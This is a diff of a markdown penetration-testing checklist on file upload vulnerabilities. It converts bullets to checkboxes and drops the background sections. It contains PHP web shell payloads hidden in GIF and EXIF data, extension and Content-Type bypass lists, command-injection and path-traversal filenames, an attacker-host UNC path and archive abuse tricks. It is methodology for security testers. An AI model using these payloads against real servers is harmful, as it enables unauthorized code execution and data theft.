@@ -1,83 +1,36 @@
-# File Upload Vulnerabilities
-
-## Mechanisms
-
-```mermaid
-flowchart TD
-    A[File Upload Vulnerabilities] --> B[Insufficient File Type Validation]
-    A --> C[Improper Extension Handling]
-    A --> D[Inadequate File Content Analysis]
-    A --> E[Unsafe File Storage]
-    A --> F[File Operation Mishandling]
-    A --> G[Directory Traversal]
-    A --> H[Race Conditions]
-
-    B --> I[Remote Code Execution]
-    C --> I
-    D --> J[Client-Side Attacks]
-    E --> I
-    F --> K[Denial of Service]
-    G --> L[Arbitrary File Access]
-    H --> I
-```
-
-File upload vulnerabilities occur when web applications allow users to upload files without implementing proper validation, filtering, and handling mechanisms.
-These vulnerabilities can lead to various attacks, ranging from simple web defacement to complete server compromise through remote code execution.
-
-The core technical issues behind file upload vulnerabilities include:
-
-- **Insufficient File Type Validation**: Failure to properly validate the actual content/type of uploaded files
-- **Improper Extension Handling**: Not restricting dangerous file extensions or allowing easy bypasses
-- **Inadequate File Content Analysis**: Not checking the actual file content versus relying only on extension or content-type
-- **Unsafe File Storage**: Storing files in executable directories or with dangerous permissions
-- **File Operation Mishandling**: Not securely handling file operations during the upload process
-- **Directory Traversal Vulnerabilities**: Allowing manipulation of upload paths
-- **Race Conditions**: Timing issues during validation and moving of uploaded files
-- **Archive Extraction Flaws**: Insecure handling of archive formats like ZIP or TAR (e.g., Symlink abuse, Zip Slip)
-
-File upload vulnerabilities can manifest in various upload functionality patterns:
-
-- **Profile Picture Uploads**: Common in user profiles and social media
-- **Document Repositories**: File sharing services and document management systems
-- **Media Uploads**: Image, video, and audio uploaders
-- **Bulk Import Features**: CSV, XML, and other data import functionality
-- **Content Management Systems**: Templates, plugins, themes, and media libraries
-
-## Hunt
-
-### Identifying File Upload Vulnerabilities
-
+## Hunting
+### How to identify?
 #### Target Discovery
 
 1. **Map File Upload Functionality**:
-   - Profile picture uploads
-   - Document/attachment uploads
-   - Import/export features
-   - Media galleries
-   - CMS admin sections
-   - Backup/restore features
-   - Avatar/image uploads
+   - [ ] Profile picture uploads
+   - [ ] Document/attachment uploads
+   - [ ] Import/export features
+   - [ ] Media galleries
+   - [ ] CMS admin sections
+   - [ ] Backup/restore features
+   - [ ] Avatar/image uploads
 
 2. **Identify Upload Processing Patterns**:
-   - Client-side validation patterns (JavaScript checks)
-   - Server-side validation indicators
-   - File type restrictions mentioned in UI
-   - Error messages related to file types
+   - [ ] Client-side validation patterns (JavaScript checks)
+   - [ ] Server-side validation indicators
+   - [ ] File type restrictions mentioned in UI
+   - [ ] Error messages related to file types
 
-3. **Testing Prerequisites**:
-   - Collection of test files (various formats)
-   - Proxy for intercepting requests (Burp Suite, ZAP)
-   - Web shells for testing execution
-   - MIME-type tools for manipulation
-   - Containerized/sandboxed converters ready for validation (e.g., bwrap/seccomp profiles)
+- **Prerequisites**:
+   - [ ] Collection of test files (various formats)
+   - [ ] Proxy for intercepting requests (Burp Suite, ZAP)
+   - [ ] Web shells for testing execution
+   - [ ] MIME-type tools for manipulation
+   - [ ] Containerized/sandboxed converters ready for validation (e.g., bwrap/seccomp profiles)
 
 #### Testing Methodologies
 
 1. **Basic File Upload Testing**:
-   - Test uploading standard expected files (baseline)
-   - Attempt uploading executable file types (PHP, ASP, JSP, etc.)
-   - Modify content-type headers during upload
-   - Change file extensions after client-side validation
+   - [ ] Test uploading standard expected files (baseline)
+   - [ ] Attempt uploading executable file types (PHP, ASP, JSP, etc.)
+   - [ ] Modify content-type headers during upload
+   - [ ] Change file extensions after client-side validation
 
 2. **Extension-Based Testing**:
    - [ ] Test alternate extensions for web shells:
@@ -88,7 +41,7 @@ File upload vulnerabilities can manifest in various upload functionality pattern
  .cfm, .cfml, .cfc, .dbm (Coldfusion)
  .pl, .py, .rb, .cgi
  ```
-- Test double extensions:
+- [ ] Test double extensions:
  ```
  file.jpg.php
  file.php.jpg
@@ -98,7 +51,7 @@ File upload vulnerabilities can manifest in various upload functionality pattern
  file.php%0d%0a.jpg # CRLF injection
  file.php.blah123jpg # If regex is weak
  ```
-- Test case sensitivity bypass:
+- [ ] Test case sensitivity bypass:
  ```
  file.PhP
  file.Php5
@@ -107,7 +60,7 @@ File upload vulnerabilities can manifest in various upload functionality pattern
  file.pHP5
  file.PhAr
  ```
-- Test trailing characters/delimiters:
+- [ ] Test trailing characters/delimiters:
  ```
  file.php.....
  file.php/
@@ -121,29 +74,27 @@ File upload vulnerabilities can manifest in various upload functionality pattern
  file. # No extension
  .html # Just extension
  ```
-- Test filename manipulation:
+- [ ] Test filename manipulation:
  ```
  # Try to cut extension with max filename length limit
  # Try empty filename: .php
  # Send filename parameter twice: filename="allowed.jpg";filename="shell.php"
  ```
 
-3. **Content-Type Testing**:
-   - Modify the Content-Type header to bypass MIME validation:
-     ```
-     Content-Type: image/jpeg  # actual file is PHP
-     Content-Type: image/png   # actual file is PHP
-     Content-Type: image/gif   # actual file is PHP
-     Content-Type: application/x-php  # declared as image/jpeg when sent
-     ```
-   - Other Content-Type manipulations:
-     ```
-     # Remove Content-Type header entirely
-     # Send Content-Type twice with allowed/disallowed values
-     ```
+1. **Content-Type Testing**:
+   - [ ] Modify the Content-Type header to bypass MIME validation:
+```
+ Content-Type: image/jpeg  # actual file is PHP
+ Content-Type: image/png   # actual file is PHP
+ Content-Type: image/gif   # actual file is PHP
+ Content-Type: application/x-php  # declared as image/jpeg when sent
+```
+   - [ ] Other Content-Type manipulations:
+	 - [ ] Remove Content-Type header entirely
+	 - [ ] Send Content-Type twice with allowed/disallowed values
 
 4. **Magic Byte Forging**:
-   - If validation relies on magic bytes, prefix the malicious file content with valid magic bytes of an allowed type.
+   - [ ] If validation relies on magic bytes, prefix the malicious file content with valid magic bytes of an allowed type.
 
    ```
    # Example: Add GIF header to a PHP shell
@@ -151,52 +102,52 @@ File upload vulnerabilities can manifest in various upload functionality pattern
    ```
 
 5. **Polyglot File Testing**:
-   - Create and test polyglot files (valid in multiple formats)
-     ```
-     GIFAR files (GIF + RAR)
-     Valid Image + PHP code in EXIF metadata
-     PDF + PHP code
-     SVG + JavaScript for XSS
-     ```
-   - see [@dan_crowley's talk](http://goo.gl/pquXC2) and [@angealbertini research](https://github.com/abzcoding/Notes/blob/master/pentest/corkami.com)
+   - [ ] Create and test polyglot files (valid in multiple formats)
+ ```
+ GIFAR files (GIF + RAR)
+ Valid Image + PHP code in EXIF metadata
+ PDF + PHP code
+ SVG + JavaScript for XSS
+ ```
+   - [ ] see [@dan_crowley's talk](http://goo.gl/pquXC2) and [@angealbertini research](https://github.com/abzcoding/Notes/blob/master/pentest/corkami.com)
 
 6. **Path and Filename Abuse Testing**:
-   - Test path traversal in filename:
-     ```
-     filename=../../../../etc/passwd
-     filename=/etc/passwd
-     filename=\\attacker-site.com\file.png # UNC Path (Windows specific, may trigger SMB connection)
-     ```
-   - Test injections via filename (if filename is processed unsafely):
-     ```
-     filename=a$(whoami)z.png # Command Injection
-     filename=a`whoami`z.png  # Command Injection
-     filename="a';select+sleep(10);--z.png" # SQL Injection
-     filename=https://internal.service/data # SSRF attempt
-     ```
-   - Test DoS via large filename (e.g., 255+ characters).
+   - [ ] Test path traversal in filename:
+ ```bash
+ filename=../../../../etc/passwd
+ filename=/etc/passwd
+ filename=\\attacker-site.com\file.png # UNC Path (Windows specific, may trigger SMB connection)
+ ```
+   - [ ] Test injections via filename (if filename is processed unsafely):
+ ```bash
+ filename=a$(whoami)z.png # Command Injection
+ filename=a`whoami`z.png  # Command Injection
+ filename="a';select+sleep(10);--z.png" # SQL Injection
+ filename=https://internal.service/data # SSRF attempt
+ ```
+   - [ ] Test DoS via large filename (e.g., 255+ characters).
 
 7. **Archive Testing (Zip/Tar)**:
-   - **Zip Slip**: Create archives with path traversal (`../../tmp/shell.php`).
-   - **Symlink Abuse**: Include symlinks in archives pointing to sensitive files (`ln -s /etc/passwd link.txt`).
-   - **Tar Permissions Abuse**: Create tar with restrictive parent dir permissions (`chmod 300`) but permissive subdir (`chmod 700`) containing symlinks.
-   - Also test LFI access via zip wrapper: `site.com/path?page=zip://path/to/uploaded/file.zip%23shell.php`
+   - [ ] **Zip Slip**: Create archives with path traversal (`../../tmp/shell.php`).
+   - [ ] **Symlink Abuse**: Include symlinks in archives pointing to sensitive files (`ln -s /etc/passwd link.txt`).
+   - [ ] **Tar Permissions Abuse**: Create tar with restrictive parent dir permissions (`chmod 300`) but permissive subdir (`chmod 700`) containing symlinks.
+   - [ ] Also test LFI access via zip wrapper: `site.com/path?page=zip://path/to/uploaded/file.zip%23shell.php`
 
 8. **ImageMagick Testing**:
-   - Test for vulnerabilities like SSRF, LFI, RCE (e.g., ImageTragick CVEs) if the server uses ImageMagick for image processing.
-   - See details in the "Impact Scenarios -> ImageMagick Vulnerabilities" section.
+   - [ ] Test for vulnerabilities like SSRF, LFI, RCE (e.g., ImageTragick CVEs) if the server uses ImageMagick for image processing.
+   - [ ] See details in the "Impact Scenarios -> ImageMagick Vulnerabilities" section.
 
 9. **Third-Party Library Testing**:
-   - Check for vulnerabilities in libraries used for processing uploads (e.g., ExifTool CVE-2021-22204).
+   - [ ] Check for vulnerabilities in libraries used for processing uploads (e.g., ExifTool CVE-2021-22204).
 
 10. **Race Condition Testing**:
-    - **File Upload Race**: Rapidly request the uploaded file path immediately after initiating the upload, attempting access before validation/removal.
-    - **URL-Based Upload Race**: If uploading via URL, rapidly request the temporary local copy path while the server fetches/validates.
-    - **HTTP/2 Multiplex Smuggling**: Abuse concurrent stream uploads to bypass validation or size limits by interleaving unvalidated chunks.
-    - **Temp path reads**: Try accessing temporary upload paths before move/scan completes.
+    - [ ] **File Upload Race**: Rapidly request the uploaded file path immediately after initiating the upload, attempting access before validation/removal.
+    - [ ] **URL-Based Upload Race**: If uploading via URL, rapidly request the temporary local copy path while the server fetches/validates.
+    - [ ] **HTTP/2 Multiplex Smuggling**: Abuse concurrent stream uploads to bypass validation or size limits by interleaving unvalidated chunks.
+    - [ ] **Temp path reads**: Try accessing temporary upload paths before move/scan completes.
 
 11. **SSRF via HTTP Range Requests**:
-    - If uploading via URL, try manipulating `Range` headers to potentially redirect parts of the download to internal servers.
+    - [ ] If uploading via URL, try manipulating `Range` headers to potentially redirect parts of the download to internal servers.
 
 ### Bypass Techniques
 
@@ -221,30 +172,29 @@ mindmap
 #### Client-Side Validation Bypasses
 
 1. **Disabling JavaScript**:
-   - Disable JavaScript to bypass client-side checks
-   - Use browser developer tools to modify the DOM
+   - [ ] Disable JavaScript to bypass client-side checks
+   - [ ] Use browser developer tools to modify the DOM
 
 2. **Request Interception**:
-   - Intercept and modify upload requests using Burp Suite or ZAP
-   - Change file parameters post-validation
+   - [ ] Intercept and modify upload requests using Burp Suite or ZAP
+   - [ ] Change file parameters post-validation
 
 3. **Extension Manipulation Techniques**:
-
+- [ ] Null byte injection (for PHP < 5.3.4)
 ```
-# Null byte injection (for PHP < 5.3.4)
 shell.php%00.jpg
 shell.php\x00.jpg
-
-# Using alternate representations
+```
+- [ ] Using alternate representations
+```
 shell.php.....
 shell.php;.jpg
 shell.php::$DATA.jpg
-
-# Manipulating request content
-1. Upload legitimate image
-2. Intercept request
-3. Replace file content with shell while keeping filename
 ```
+- [ ] Manipulating request content
+	1. Upload legitimate image
+	2. Intercept request
+	3. Replace file content with shell while keeping filename
 
 4. **MIME-Type Manipulation**:
    - Modify Content-Type header to match expected type
@@ -253,16 +203,16 @@ shell.php::$DATA.jpg
 #### Server-Side Validation Bypasses
 
 1. **Metadata Injection**:
-   - Inject code into image metadata (EXIF)
+   - [ ] Inject code into image metadata (EXIF)
 
-   ```
+   ```bash
    exiftool -Comment="<?php system(\$_GET['cmd']); ?>" payload.jpg
    ```
 
 2. **Image Content Manipulation**:
-   - Create images containing server-side code
+   - [ ] Create images containing server-side code
 
-   ```
+   ```php
    # PHP code in GIF file
    GIF89a;
    <?php system($_GET['cmd']); ?>
@@ -270,24 +220,17 @@ shell.php::$DATA.jpg
 
 3. **Advanced Polyglot Techniques**:
    - Create files that are valid in multiple formats
-
-   ```
-   # Valid JPG and PHP
-   Create JPG with PHP code after the image data
-   Add PHP code to EXIF data
-   ```
-
-4. **Path Traversal in Upload Locations**:
-
+	- [ ] use Valid JPG and PHP
+	- [ ] Create JPG with PHP code after the image data
+	- [ ] Add PHP code to EXIF data
+3. **Path Traversal in Upload Locations**:
    ```
    filename=../../../tmp/shell.php
    filename=..%2f..%2f..%2ftmp%2fshell.php
    filename=../../etc/passwd/logo.png # Example LFI attempt
    filename=\\attacker-site.com\file.png # UNC Path (Windows specific)
    ```
-
-5. **Common DenyList Bypass**:
-
+4. **Common DenyList Bypass**:
    ```
    escape "/" with "\/" or "//" with "\/\/"
    try single "/" instead of "//"
@@ -306,14 +249,11 @@ shell.php::$DATA.jpg
    filename=shell.php::$DATA # Alternate Data Stream (ADS)
    filename=shell.php:.jpg # ADS confusion
    ```
-
-6. **GIF Comment Bypass**:
+5. **GIF Comment Bypass**:
    - Inject payload within GIF comments.
-
    ```
    GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
    ```
-
 7. **Magic Byte Forging**:
    - Prepend malicious file content with the magic bytes of an allowed file type.
    ```
@@ -321,63 +261,31 @@ shell.php::$DATA.jpg
    GIF89a;
    <?php echo 'Magic Byte Bypass'; phpinfo(); ?>
    ```
-
-## Vulnerabilities
-
-### Common File Upload Vulnerability Patterns
-
-```mermaid
-graph TD
-    A[File Upload Vulnerabilities] --> B[Implementation-Specific]
-    A --> C[Impact Scenarios]
-
-    B --> D[CMS Upload Vulnerabilities]
-    B --> E[Framework Upload Vulnerabilities]
-    B --> F[Language-Specific Vulnerabilities]
-
-    C --> G[RCE]
-    C --> H[XSS]
-    C --> I[SSRF]
-    C --> J[DoS]
-    C --> K[LFI]
-```
-
-#### Implementation-Specific Vulnerabilities
-
+## Chaining and Esclation to vulnerabilities
+### Implementation-Specific Vulnerabilities
 1. **CMS Upload Vulnerabilities**:
-   - **WordPress**: Plugin and theme uploaders
-     ```
-     Upload plugin ZIP with malicious PHP files
-     SVG uploads with XSS in media library
-     ```
-   - **Drupal**: Module installations
-     ```
-     Malicious module installation via admin panel
-     ```
-   - **Joomla**: Template uploads
-     ```
-     Malicious template installation
-     ```
+	- **WordPress**:
+		- [ ] Plugin and theme uploaders
+		- [ ] Upload plugin ZIP with malicious PHP files
+		- [ ] SVG uploads with XSS in media library
+	- **Drupal**: Module installations
+		- [ ] Malicious module installation via admin panel
+	- **Joomla**: Template uploads
+		- [ ] Malicious template installation
 
 2. **Framework Upload Vulnerabilities**:
    - **PHP**: File upload handling in common frameworks
-     ```
-     Laravel file upload middleware bypass
-     CodeIgniter upload library misconfiguration
-     ```
+     - [ ] ==Laravel== file upload middleware bypass
+     - [ ] ==CodeIgniter== upload library misconfiguration
    - **Java**: Spring MVC file upload handlers
-     ```
-     Spring MultipartResolver misconfiguration
-     ```
+     - [ ] ==Spring== MultipartResolver misconfiguration
    - **ASP.NET**: File upload components
-     ```
-     ASP.NET FileUpload control misconfiguration
-     ```
+     - [ ] ==ASP.NET== FileUpload control misconfiguration\
 
 3. **Language-Specific Upload Vulnerabilities**:
-   - **PHP**: move_uploaded_file() race conditions
-   - **Java**: Temporary file creation vulnerabilities
-   - **Node.js**: Express-fileupload vulnerabilities
+	- [ ] **PHP**: move_uploaded_file() race conditions
+	- [ ] **Java**: Temporary file creation vulnerabilities
+	- [ ] **Node.js**: Express-fileupload vulnerabilities
 
 ### Impact Scenarios
 
@@ -573,8 +481,9 @@ pop graphic-context
 exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' shell.jpg
 mv shell.jpg shell.php.jpg
 ```
+## Examples and automation
 
-### New CVEs
+### some CVEs
 
 - **CVE-2024-29510 – Ghostscript ≤ 10.03.0 EPS/JPG RCE**: Exploit via EPS-in-JPG polyglot when Ghostscript is used for image conversion.
 - **CVE-2024-53677 – Apache Struts S2-067**: Multipart upload path-traversal leading to RCE.
@@ -583,9 +492,6 @@ mv shell.jpg shell.php.jpg
 - Image processing stacks (libvips/Sharp, GraphicsMagick/ImageMagick, Ghostscript, pdfium) continue to receive critical parser bugs; sandbox converters and track advisories.
 - HEIC/AVIF conversion pipelines frequently mishandle temporary files and trust `Content-Type`/magic bytes.
 - Serverless image proxies (imgproxy, Thumbor, custom Lambda/Cloud Functions) often allow SSRF/LFI via remote URL sources.
-
-## Methodologies
-
 ### Tools
 
 #### File Upload Vulnerability Testing Tools
@@ -653,39 +559,6 @@ for test in test_cases:
     print(f"Testing {test['name']} ({test['type']}): {result['status_code']}")
 ```
 
-### Testing Strategies
-
-#### Comprehensive File Upload Testing Process
-
-1. **Discovery Phase**:
-   - Map all file upload functionality
-   - Identify client-side and server-side validation patterns
-   - Document allowed file types and upload restrictions
-
-2. **Initial Testing Phase**:
-   - Test baseline functionality with expected file types
-   - Test basic restriction bypasses:
-     - Extension manipulation
-     - Content-Type manipulation
-     - Simple payload attempts
-
-3. **Advanced Testing Phase**:
-   - Test for complex bypass techniques:
-     - Polyglot files
-     - Metadata injection
-     - Race conditions
-     - Upload directory traversal
-
-4. **Exploitation Phase**:
-   - Verify code execution for successful uploads
-   - Test chained attack scenarios
-   - Document impact and attack chains
-
-5. **Post-Exploitation Testing**:
-   - Test upload persistence
-   - Test access control on uploaded files
-   - Test ability to access uploads across user contexts
-
 #### Real-World Testing Examples
 
 ##### CMS File Upload Testing
@@ -693,10 +566,10 @@ for test in test_cases:
 1. Identify CMS type and version
 2. Map file upload functionality (plugins, themes, media)
 3. Test bypasses specific to the CMS:
-   - WordPress: Plugin installation with malicious PHP
-   - Drupal: Module upload with executable code
-   - Joomla: Template upload with backdoor
-4. Verify code execution
+   - [ ] WordPress: Plugin installation with malicious PHP
+   - [ ] Drupal: Module upload with executable code
+   - [ ] Joomla: Template upload with backdoor
+1. Verify code execution
 
 ##### Multi-step Bypass Testing
 
